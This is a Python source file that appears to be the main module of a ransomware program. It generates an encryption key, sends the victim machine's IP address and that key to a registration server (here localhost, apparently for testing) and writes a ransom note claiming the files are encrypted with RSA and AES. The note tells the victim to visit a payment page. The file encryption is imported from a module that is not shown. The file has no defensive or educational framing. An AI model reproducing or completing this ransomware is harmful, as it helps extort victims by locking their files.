import numpy as np
import io
import PIL.Image as Image
import base64
from gege import gege
import requests
import socket
from encrypter import Encrypter, KeyGenerator


def get_ip_address():
    hostname = socket.gethostname()
    return socket.gethostbyname(hostname)


def help_text(uuid : str):
    help_text = [
        'All of your files are encrypted with RSA 2048 and AES-128 ciphers. \n',
        'More information about the RSA and AES can be found here : \n',
        'https://en.wikipedia.org/wiki/RSA_(cryptosystem) \n',
        'https://en.wikipedia.org/wiki/Advanced_Encryption_Standard \n\n',
        'Decrypting of your files is only possible with the private key and decrypt program, which is on our secret server. \n\n',
        'Follow these steps : \n',
        '1. Run your browser and wait for initialization. \n',
        '2. Type in the address bar : http://127.0.0.1:8000/payement \n',
        '3. Follow the instructions on the site. \n'    
        '!!! Your DECRYTP-ID : ' + uuid
        ]
    file = open('_HELP_INSTRUCTION.TXT', '+w')
    for t in range(len(help_text)):
        file.write(help_text[t])


def generate_image():
    b = base64.b64decode(gege)
    img = Image.open(io.BytesIO(b))
    img.show()


def main():
    encryption_key = KeyGenerator().generateKey()


    # ============================================================================= #
    base_api_url = "http://127.0.0.1:8000"
    url = base_api_url + "/register"
    ip_address = get_ip_address()
    data = {
        'ip': ip_address,
        'encryptionKey': encryption_key,
        'infectedFiles': 18
    }
    response = requests.post(url = url, json = data)
    uuid = response.json()
    help_text(uuid)
    # generate_image()


if __name__ == "__main__":
    main()
